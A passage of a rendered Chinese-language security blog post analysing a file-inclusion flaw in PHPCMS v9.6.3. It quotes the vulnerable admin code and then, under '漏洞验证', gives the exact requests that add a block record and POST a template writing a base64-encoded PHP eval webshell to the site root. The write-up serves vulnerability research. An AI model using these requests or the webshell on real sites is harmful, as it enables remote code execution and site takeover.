+</span></span><span class="line"><span class="cl">    if (!module_exists(ROUTE_M)) showmessage(L(&#39;module_not_exists&#39;));  
+</span></span><span class="line"><span class="cl">    self::manage_log();  //记录日志
+</span></span><span class="line"><span class="cl">    self::check_ip();  //后台IP禁止判断
+</span></span><span class="line"><span class="cl">    self::lock_screen();  //检查锁屏状态
+</span></span><span class="line"><span class="cl">    self::check_hash(); //检查hash值，验证用户数据安全性  
+</span></span><span class="line"><span class="cl">	     =&gt;
+</span></span><span class="line"><span class="cl">			final private function check_hash() {
+</span></span><span class="line"><span class="cl">			    if(preg_match(&#39;/^public_/&#39;, ROUTE_A) 
+</span></span><span class="line"><span class="cl">			       || ROUTE_M ==&#39;admin&#39; &amp;&amp; ROUTE_C ==&#39;index&#39; 
+</span></span><span class="line"><span class="cl">			       || in_array(ROUTE_A, array(&#39;login&#39;))) {
+</span></span><span class="line"><span class="cl">			       return true;
+</span></span><span class="line"><span class="cl">			    }
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			    // GET 提交时验证 pc_hash
+</span></span><span class="line"><span class="cl">			    if(isset($_GET[&#39;pc_hash&#39;]) &amp;&amp; $_SESSION[&#39;pc_hash&#39;] != &#39;&#39; 
+</span></span><span class="line"><span class="cl">			       &amp;&amp; ($_SESSION[&#39;pc_hash&#39;] == $_GET[&#39;pc_hash&#39;])) {
+</span></span><span class="line"><span class="cl">			       return true;
+</span></span><span class="line"><span class="cl">			    // POST 提交时验证 pc_hash
+</span></span><span class="line"><span class="cl">			    } elseif(isset($_POST[&#39;pc_hash&#39;]) &amp;&amp; $_SESSION[&#39;pc_hash&#39;] != &#39;&#39; 
+</span></span><span class="line"><span class="cl">			       &amp;&amp; ($_SESSION[&#39;pc_hash&#39;] == $_POST[&#39;pc_hash&#39;])) {
+</span></span><span class="line"><span class="cl">			       return true;
+</span></span><span class="line"><span class="cl">			    } else {
+</span></span><span class="line"><span class="cl">			       // 验证失败
+</span></span><span class="line"><span class="cl">			       showmessage(L(&#39;hash_check_false&#39;),HTTP_REFERER);
+</span></span><span class="line"><span class="cl">			    }
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if(pc_base::load_config(&#39;system&#39;,&#39;admin_url&#39;) &amp;&amp; $_SERVER[&#34;HTTP_HOST&#34;]!= pc_base::load_config(&#39;system&#39;,&#39;admin_url&#39;)) {  
+</span></span><span class="line"><span class="cl">       Header(&#34;http/1.1 403 Forbidden&#34;);  
+</span></span><span class="line"><span class="cl">       exit(&#39;No permission resources.&#39;);  
+</span></span><span class="line"><span class="cl">    }  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>在 public_view 开头做了一次检测，判断 $id 是否存在，如果不存在则返回 nofound，且查出的数据库数据中 type 需为 2 才能进入 elseif 内部触发漏洞</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function public_view() {
+</span></span><span class="line"><span class="cl">	$id = isset($_GET[&#39;id&#39;]) &amp;&amp; intval($_GET[&#39;id&#39;]) ? intval($_GET[&#39;id&#39;]) :  exit(&#39;0&#39;);  
+</span></span><span class="line"><span class="cl">	if (!$data = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id))) {  
+</span></span><span class="line"><span class="cl">	    showmessage(L(&#39;nofound&#39;));  
+</span></span><span class="line"><span class="cl">	}  
+</span></span><span class="line"><span class="cl">	if ($data[&#39;type&#39;] == 1) {  
+</span></span><span class="line"><span class="cl">	    exit(&#39;&lt;script type=&#34;text/javascript&#34;&gt;parent.showblock(&#39;.$id.&#39;, \&#39;&#39;.str_replace(&#34;\r\n&#34;, &#39;&#39;, $_POST[&#39;data&#39;]).&#39;\&#39;)&lt;/script&gt;&#39;);  
+</span></span><span class="line"><span class="cl">	} elseif ($data[&#39;type&#39;] == 2) {</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>但这个表怎么是空的？也许默认就是为空
+<figure>
+  <img src="file-20250802134112371.png" alt="" loading="lazy"></figure>
+
+在 block_admin 类往上翻一翻，发现了一个 add 类方法，就说默认为空很奇怪，肯定有功能提供添加</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function add() {  
+</span></span><span class="line"><span class="cl">    $pos = isset($_GET[&#39;pos&#39;]) &amp;&amp; trim($_GET[&#39;pos&#39;]) ? trim($_GET[&#39;pos&#39;]) : showmessage(L(&#39;illegal_operation&#39;));  
+</span></span><span class="line"><span class="cl">    if (isset($_POST[&#39;dosubmit&#39;])) {  
+</span></span><span class="line"><span class="cl">       $name = isset($_POST[&#39;name&#39;]) &amp;&amp; trim($_POST[&#39;name&#39;]) ? trim($_POST[&#39;name&#39;]) : showmessage(L(&#39;illegal_operation&#39;), HTTP_REFERER);  
+</span></span><span class="line"><span class="cl">       $type = isset($_POST[&#39;type&#39;]) &amp;&amp; intval($_POST[&#39;type&#39;]) ? intval($_POST[&#39;type&#39;]) : 1;  
+</span></span><span class="line"><span class="cl">       //判断名称是否已经存在  
+</span></span><span class="line"><span class="cl">       if ($this-&gt;db-&gt;get_one(array(&#39;name&#39;=&gt;$name))) {  
+</span></span><span class="line"><span class="cl">          showmessage(L(&#39;name&#39;).L(&#39;exists&#39;), HTTP_REFERER);  
+</span></span><span class="line"><span class="cl">       }  
+</span></span><span class="line"><span class="cl">       if ($id = $this-&gt;db-&gt;insert(array(&#39;name&#39;=&gt;$name, &#39;pos&#39;=&gt;$pos, &#39;type&#39;=&gt;$type, &#39;siteid&#39;=&gt;$this-&gt;siteid), true)) {  
+</span></span><span class="line"><span class="cl">          ...
+</span></span><span class="line"><span class="cl">       } else {  
+</span></span><span class="line"><span class="cl">       }  
+</span></span><span class="line"><span class="cl">    } else {  
+</span></span><span class="line"><span class="cl">		...
+</span></span><span class="line"><span class="cl">    }  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>insert 追进去就不写了，依照 phpcms 框架数据库操作写法，依次是 block_admin.php -&gt; model.class.php -&gt; db_mysqli.class.php，最后肯定是插入数据
+只需要提供 pos、dosubmit、name、type 即可直接添加，其中 type 必须为 2，因为我们要走进 elseif 内部，其他随意不为 false 就行
+到这里分析就结束了，这个漏洞简单且危害大，只需要添加一条数据即可利用漏洞，没有任何过滤，同类方法下刚好提供 file_put_contents 和 include 直接文件写入+文件包含一步到位</p>
+<h1 class="heading-element" id="漏洞验证"><span>漏洞验证</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>先往 v9_block 表内添加一条数据</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?id=1&amp;m=block&amp;c=block_admin&amp;a=add&amp;XDEBUG_SESSION_START=13013&amp;pc_hash=uWIbNs&amp;pos=1
+</span></span><span class="line"><span class="cl">POST:name=a&amp;type=2&amp;dosubmit=1</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250802175756489.png" alt="" loading="lazy"></figure>
+
+然后向 block_admin.php::public_view 传参，这个类方法提供的应该是一个预览功能</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?id=1&amp;m=block&amp;c=block_admin&amp;a=public_view&amp;XDEBUG_SESSION_START=13013&amp;pc_hash=uWIbNs
+</span></span><span class="line"><span class="cl">POST：template=&lt;?php file_put_contents(&#39;L1nJ3.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg==&#39;)); ?&gt;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250802175944515.png" alt="" loading="lazy"></figure>
+
+根目录下就出现了写入的文件了
+<figure>
+  <img src="file-20250802180214108.png" alt="" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/files-include/" class="post-footer-tag-link" title="Tags - Files Include">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Files Include</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="PHPCMSv9.6.3 文件包含漏洞分析" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Files Include"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-hashtag="Files Include"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="PHPCMSv9.6.3 文件包含漏洞分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9.6.1-2 任意文件下载漏洞分析</div>
+          </div>
+        </a><a href="/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">浅析 PHPCMSv9.6.3 上下文逃逸导致RCE</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#代码审计">代码审计</a></li>
+    <li><a href="#漏洞验证">漏洞验证</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/10fb59a35ff99087fb1d277444aa56db.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
